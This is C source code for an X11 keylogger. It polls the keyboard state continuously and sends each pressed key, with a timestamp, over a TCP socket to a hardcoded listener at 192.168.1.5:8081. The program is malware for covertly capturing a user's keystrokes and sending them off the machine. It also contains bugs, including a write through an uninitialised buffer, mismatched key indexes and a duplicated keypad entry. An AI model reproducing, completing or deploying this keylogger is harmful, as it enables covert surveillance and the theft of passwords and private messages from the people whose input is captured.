#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define DEST_IP "192.168.1.5"
#define DEST_PORT 8081

char*
get_time()
{
	time_t rawtime;
	struct tm * timeinfo;
	char * buffer;

	time (&rawtime);
	timeinfo = localtime (&rawtime);

	strftime(buffer, 80,"%d-%m %H:%M:%S",timeinfo);
	return buffer;
}

void
send_message(int sockfd, char* message)
{
	char final_message[100];
	char *time_now = get_time();

	snprintf(final_message, 90, "[%s] - %s\n", time_now, message);
	printf("%s", final_message);

	ssize_t bytes_sent = send(sockfd, final_message, strlen(final_message), 0);

	if (bytes_sent == -1) {
		perror("Failed to send data");
		close(sockfd);
	}
}

int key_is_pressed(KeySym ks) {
	static Display* dpy = NULL;
	
	if (!dpy)
		dpy = XOpenDisplay(NULL);
	
	char keys_return[32];
	XQueryKeymap(dpy, keys_return);
	KeyCode kc2 = XKeysymToKeycode(dpy, ks);
	int isPressed = !!(keys_return[kc2 >> 3] & (1 << (kc2 & 7)));
	
	return isPressed;
}

void get_keys(int sockfd) {
	static int last_state[40] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	        		     0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	    			     0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	    			     0, 0, 0, 0, 0, 0, 0, 0, 0};
	
	static int prev_state[40] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	        		     0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	    			     0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	    			     0, 0, 0, 0, 0, 0, 0, 0, 0};
	
	int current_state[40] = {
	    key_is_pressed(XK_Up),
	    key_is_pressed(XK_Down),
	    key_is_pressed(XK_Left),
	    key_is_pressed(XK_Right),
	    key_is_pressed(XK_A),
	    key_is_pressed(XK_B),
	    key_is_pressed(XK_C),
	    key_is_pressed(XK_D),
	    key_is_pressed(XK_E),
	    key_is_pressed(XK_F),
	    key_is_pressed(XK_G),
	    key_is_pressed(XK_H),
	    key_is_pressed(XK_I),
	    key_is_pressed(XK_J),
	    key_is_pressed(XK_K),
	    key_is_pressed(XK_L),
	    key_is_pressed(XK_M),
	    key_is_pressed(XK_N),
	    key_is_pressed(XK_O),
	    key_is_pressed(XK_P),
	    key_is_pressed(XK_Q),
	    key_is_pressed(XK_R),
	    key_is_pressed(XK_S),
	    key_is_pressed(XK_T),
	    key_is_pressed(XK_U),
	    key_is_pressed(XK_V),
	    key_is_pressed(XK_W),
	    key_is_pressed(XK_X),
	    key_is_pressed(XK_Y),
	    key_is_pressed(XK_Z),
	    key_is_pressed(XK_KP_0),
	    key_is_pressed(XK_KP_1),
	    key_is_pressed(XK_KP_2),
	    key_is_pressed(XK_KP_3),
	    key_is_pressed(XK_KP_4),
	    key_is_pressed(XK_KP_5),
	    key_is_pressed(XK_KP_6),
	    key_is_pressed(XK_KP_7),
	    key_is_pressed(XK_KP_7),
	    key_is_pressed(XK_KP_9),
	};
	
	for (int i = 0; i < 31; i++) {
		if (current_state[i] && !last_state[i] && !prev_state[i]) {
			switch (i) {
			case 0: send_message(sockfd, "Up"); break;
			case 1: send_message(sockfd, "Down"); break;
			case 2: send_message(sockfd, "Left"); break;
			case 3: send_message(sockfd, "Right"); break;
			case 4: send_message(sockfd, "A"); break;
			case 5: send_message(sockfd, "B"); break;
			case 6: send_message(sockfd, "C"); break;
			case 7: send_message(sockfd, "D"); break;
			case 8: send_message(sockfd, "E"); break;
			case 9: send_message(sockfd, "F"); break;
			case 10: send_message(sockfd, "G"); break;
			case 11: send_message(sockfd, "H"); break;
			case 12: send_message(sockfd, "I"); break;
			case 13: send_message(sockfd, "J"); break;
			case 14: send_message(sockfd, "K"); break;
			case 15: send_message(sockfd, "L"); break;
			case 16: send_message(sockfd, "M"); break;
			case 17: send_message(sockfd, "N"); break;
			case 18: send_message(sockfd, "O"); break;
			case 19: send_message(sockfd, "P"); break;
			case 20: send_message(sockfd, "Q"); break;
			case 21: send_message(sockfd, "R"); break;
			case 22: send_message(sockfd, "S"); break;
			case 23: send_message(sockfd, "T"); break;
			case 24: send_message(sockfd, "U"); break;
			case 25: send_message(sockfd, "V"); break;
			case 26: send_message(sockfd, "W"); break;
			case 27: send_message(sockfd, "X"); break;
			case 28: send_message(sockfd, "Y"); break;
			case 29: send_message(sockfd, "Z"); break;
			case 30: send_message(sockfd, "0"); break;
			case 31: send_message(sockfd, "1"); break;
			case 32: send_message(sockfd, "2"); break;
			case 33: send_message(sockfd, "3"); break;
			case 34: send_message(sockfd, "4"); break;
			case 35: send_message(sockfd, "5"); break;
			case 36: send_message(sockfd, "6"); break;
			case 37: send_message(sockfd, "7"); break;
			case 39: send_message(sockfd, "8"); break;
			case 40: send_message(sockfd, "9"); break;
			}
		}
		prev_state[i] = last_state[i];
		last_state[i] = current_state[i];
	}
}

int
main(void)
{
	int sockfd;
	struct sockaddr_in dest_addr;
	
	/* initialize socket */
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		perror("Failed to create socket");
		return 1;
	}
	
	/* configure address details */
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(DEST_PORT);
	if (inet_pton(AF_INET, DEST_IP, &dest_addr.sin_addr) <= 0) {
		perror("Invalid destination address");
		close(sockfd);
		return 1;
	}
	
	/* connect to the listener */
	if (connect(sockfd, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) == -1) {
		perror("Failed to connect");
		close(sockfd);
		return 1;
	}
	
	do {
		get_keys(sockfd);
		usleep(1000);
	} while (1);
	
	return 0;
}
